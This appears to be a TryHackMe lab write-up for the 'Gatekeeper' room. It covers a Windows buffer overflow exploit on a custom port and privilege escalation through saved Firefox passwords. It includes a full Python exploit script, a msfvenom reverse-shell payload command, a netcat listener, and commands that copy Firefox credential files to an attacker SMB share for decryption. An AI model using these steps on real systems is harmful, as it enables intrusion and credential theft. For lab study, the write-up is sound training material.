# Gatekeeper — TryHackMe Writeup

**Category:** Buffer Overflow / Privilege Escalation  
**Difficulty:** Medium  
**Objective:** Exploit a Buffer Overflow vulnerable service to gain initial access, then escalate privileges via credentials saved in Firefox.

---

## Reconnaissance

### Nmap

```bash
nmap 10.66.132.48 -sC -sV -p- --min-rate 5000
```

**Relevant ports:**

| Port | Service |
|---|---|
| 139/445 | SMB (Windows 7 SP1) |
| 3389 | RDP |
| 31337 | Custom service (echoes input) |

The service on port **31337** immediately stands out: it responds "Hello" to any input received — typical behavior of a Buffer Overflow vulnerable application.

---

## Phase 1 — Buffer Overflow on port 31337

### Obtaining the binary

The service on port 31337 is served by `gatekeeper.exe`, available via SMB:

```bash
smbclient -L //10.66.132.48 -N
smbclient //10.66.132.48/Users -N
# cd Share
# get gatekeeper.exe
```

### Running locally for debugging

```bash
WINEARCH=win32 WINEPREFIX=~/.wine32 wine gatekeeper.exe
```

### Fuzzing — identifying the crash

Sending a large payload to identify the crash:

```bash
python3 -c "print('A' * 200)" | nc 127.0.0.1 31337
```

The service drops the connection — confirming Buffer Overflow.

### Finding the offset

Generate a unique pattern with Metasploit:

```bash
msf-pattern_create -l 200
```

Send the pattern, check the EIP value in the debugger (edb), then calculate the offset:

```bash
msf-pattern_offset -l 200 -q 39654138
# [*] Exact match at offset 146
```

**Offset: 146 bytes**

### Verifying EIP control

```python
payload = b"A" * 146 + b"B" * 4 + b"C" * 50
```

EIP = `42424242` (`BBBB`) — full control confirmed.

### Finding JMP ESP

```bash
ropper --file /tmp/gatekeeper.exe --search "jmp esp"
# 0x080414c3: jmp esp;
```

### Generating shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<TUN0_IP> LPORT=4444 \
  -b "\x00\x0a\x0d" -f python EXITFUNC=thread
```

> **Note:** Bad chars `\x0a` and `\x0d` (newline and carriage return) are critical — the service uses `\r\n` as a delimiter, which would corrupt the shellcode.

### Final exploit

```python
import socket
import struct

ip = "10.66.132.48"
port = 31337

offset = 146
jmp_esp = struct.pack("<I", 0x080414c3)
nop_sled = b"\x90" * 16

buf = b""  # shellcode generated by msfvenom

payload = b"A" * offset + jmp_esp + nop_sled + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload + b"\r\n")
s.close()
```

### Listener

```bash
nc -lvnp 4444
```

**Shell obtained as:** `gatekeeper\natbat`

**User Flag:** found at `C:\Users\natbat\Desktop\user.txt.txt`

## Phase 2 — Privilege Escalation via Firefox

### Identifying the vector

Firefox was installed at `C:\Program Files (x86)\Mozilla Firefox\`. Browsers store credentials locally — a classic Windows privesc vector.

### Extracting profile files

```cmd
dir "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\"
```

Relevant profile: `ljfn812a.default-release`

Required files: `key4.db` and `logins.json`

### Exfiltrating via SMB

On Kali:
```bash
impacket-smbserver share /tmp -smb2support
```

On the victim:
```cmd
copy "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\key4.db" \\<KALI_IP>\share\key4.db
copy "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\logins.json" \\<KALI_IP>\share\logins.json
```

### Decrypting with firepwd

```bash
git clone https://github.com/lclevy/firepwd.git
cd firepwd
pip install -r requirements.txt --break-system-packages

mkdir /tmp/firefox_profile
cp /tmp/key4.db /tmp/firefox_profile/
cp /tmp/logins.json /tmp/firefox_profile/

python3 firepwd.py -d /tmp/firefox_profile
```


## Key Takeaways

- **Classic Buffer Overflow** on Windows 7: without effective ASLR/DEP, the `JMP ESP` address is static and reliable.
- **Bad chars** are critical — excluding `\x00` alone is not enough. Always analyze the service protocol to identify delimiters that could corrupt the payload.
- **EXITFUNC=thread** prevents the parent process crash from killing the shell.
- **Browser-saved credentials** are a frequently overlooked privesc vector — Firefox stores passwords encrypted locally and tools like `firepwd` break that protection easily.
- **firepwd** is more reliable than `firefox_decrypt` in environments without Firefox installed locally (no NSS dependency).
